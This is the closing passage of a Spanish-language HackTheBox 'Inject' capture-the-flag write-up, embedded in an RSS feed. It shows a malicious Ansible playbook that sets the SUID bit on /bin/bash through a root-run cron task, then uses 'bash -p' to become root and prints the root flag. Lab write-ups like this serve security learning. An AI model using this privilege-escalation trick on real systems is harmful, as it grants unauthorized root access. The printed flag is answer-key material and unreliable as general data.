  &lt;li&gt;&lt;a href=&quot;https://docs.ansible.com/ansible/latest/collections/ansible/builtin/command_module.html&quot;&gt;ansible-builtin-command-module&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;phil@inject:/opt/automation/tasks$ cat reverse.yml 
- hosts: localhost
  tasks:
  - name: suid to bash
    ansible.builtin.shell: chmod u+s /bin/bash
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora solo debemos esperar a que se ejecute la tarea y podemos ver que la &lt;code&gt;bash&lt;/code&gt; ahora cuenta con el privilegio &lt;code&gt;suid&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;phil@inject:/opt/automation/tasks$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Lo que nos queda ahora es convertirnos en el usuario &lt;code&gt;root&lt;/code&gt;, dirigirnos a su directorio personal y visualizar la segunda flag &lt;code&gt;root.txt&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;phil@inject:/opt/automation/tasks$ bash -p
bash-5.0# whoami
root
bash-5.0# cd /root
bash-5.0# cat root.txt 
26521e5fb779f8e62fa4d068175a3b5a
&lt;/code&gt;&lt;/pre&gt;
</description>
        <pubDate>Wed, 19 Jul 2023 00:00:00 -0500</pubDate>
        <link>http://localhost:4000/hackthebox/htb-writeup-Inject</link>
        <guid isPermaLink="true">http://localhost:4000/hackthebox/htb-writeup-Inject</guid>
        
        <category>Web Enumeation</category>
        
        <category>Local File Inclusion</category>
        
        <category>Information Leaked</category>
        
        <category>Spring CLoud Explotation</category>
        
        <category>Abusing Cron Job</category>
        
        <category>Malicius Ansible Playbook</category>
        
        
        <category>hackthebox</category>
        
      </item>
    
  </channel>
</rss>
